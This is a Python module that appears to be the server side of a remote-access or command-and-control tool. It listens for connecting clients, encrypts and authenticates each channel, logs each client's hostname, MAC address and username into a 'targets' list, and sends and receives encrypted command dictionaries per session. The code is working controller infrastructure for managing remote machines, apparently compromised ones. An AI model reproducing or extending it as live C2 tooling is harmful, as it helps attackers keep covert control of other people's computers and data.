import socket
import json
import time
from .encryption import initialize_encryption
from .authentication import authenticate_client
from .logging_config import logging
from .rate_limiter import is_rate_limited

# Global variables
targets = []
ips = []
client_info_map = {}
next_session_id = 0
stop_threads = False
server_socket = None

def send_data(target_socket, command_dict):
    try:
        ip_str = next((k for k, v in client_info_map.items() if v['socket'] == target_socket), 'Unknown')
        cipher = client_info_map.get(ip_str, {}).get('cipher')
        if not cipher:
            logging.error(f"No cipher found for client {ip_str}", extra={'session_id': 'N/A'})
            return
        encrypted_data = cipher.encrypt(json.dumps(command_dict).encode('utf-8'))
        target_socket.send(encrypted_data)
    except Exception as e:
        logging.error(f"Error sending data: {e}", extra={'session_id': 'N/A'})
        from .client_management import handle_client_disconnection
        handle_client_disconnection(target_socket)

def recv_data(target_socket):
    try:
        ip_str = next((k for k, v in client_info_map.items() if v['socket'] == target_socket), 'Unknown')
        cipher = client_info_map.get(ip_str, {}).get('cipher')
        if not cipher:
            logging.error(f"No cipher found for client {ip_str}", extra={'session_id': 'N/A'})
            return None
        while True:
            chunk = target_socket.recv(4096)
            if not chunk:
                from .client_management import handle_client_disconnection
                handle_client_disconnection(target_socket)
                return None
            try:
                decrypted_data = cipher.decrypt(chunk).decode('utf-8')
                return json.loads(decrypted_data)
            except json.JSONDecodeError:
                continue
            except Exception as e:
                logging.error(f"Decryption error: {e}", extra={'session_id': 'N/A'})
                return None
    except Exception as e:
        logging.error(f"Recv_data error: {e}", extra={'session_id': 'N/A'})
        return None

def server_listen():
    global server_socket, targets, ips, client_info_map, next_session_id, stop_threads
    with open('config/config.json') as f:
        config = json.load(f)
    bind_ip = config['bind_ip']
    bind_port = config['bind_port']
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((bind_ip, bind_port))
        server_socket.listen(5)
    except Exception as e:
        logging.error(f"Failed to bind server to {bind_ip}:{bind_port} - {e}", extra={'session_id': 'N/A'})
        stop_threads = True
        return
    logging.info(f"Server listening on: {bind_ip}:{bind_port}", extra={'session_id': 'N/A'})

    while not stop_threads:
        server_socket.settimeout(1.0)
        try:
            client_socket, client_address = server_socket.accept()
            client_ip = client_address[0]
            if is_rate_limited(client_ip):
                logging.warning(f"Rate limit exceeded for {client_ip}. Connection rejected.", extra={'session_id': 'N/A'})
                client_socket.close()
                continue
            client_socket.settimeout(None)
            
            # Initialize encryption
            cipher = initialize_encryption(client_socket)
            
            # Authenticate client
            if not authenticate_client(client_socket):
                logging.error(f"Authentication failed for {client_address[0]}:{client_address[1]}", extra={'session_id': 'N/A'})
                client_socket.close()
                continue
            
            # Store client information
            initial_data_payload = recv_data(client_socket)
            if initial_data_payload and isinstance(initial_data_payload, dict) and initial_data_payload.get("type") == "initial_info":
                info_str = initial_data_payload.get("data", "Unknown,Unknown,Unknown")
                hostname, mac_address, username = info_str.split(',', 2) if info_str.count(',') == 2 else ("Unknown", "Unknown", "Unknown")
                ip_str = f"{client_address[0]}:{client_address[1]}"
                targets.append(client_socket)
                ips.append(client_address)
                client_info_map[ip_str] = {
                    'socket': client_socket,
                    'ip_str': ip_str,
                    'hostname': hostname,
                    'mac': mac_address,
                    'user': username,
                    'session_id': next_session_id,
                    'connected_at': time.strftime("%Y-%m-%d %H:%M:%S"),
                    'cipher': cipher
                }
                session_id = next_session_id
                next_session_id += 1
                logging.info(f"Connection from: {username}@{hostname} ({ip_str}) - Session ID: {session_id}", extra={'session_id': session_id})
            else:
                logging.error(f"Failed to get initial info from {client_address[0]}:{client_address[1]}", extra={'session_id': 'N/A'})
                client_socket.close()
        except socket.timeout:
            continue
        except Exception as e:
            if not stop_threads:
                logging.error(f"Error in server_listen: {e}", extra={'session_id': 'N/A'})
            continue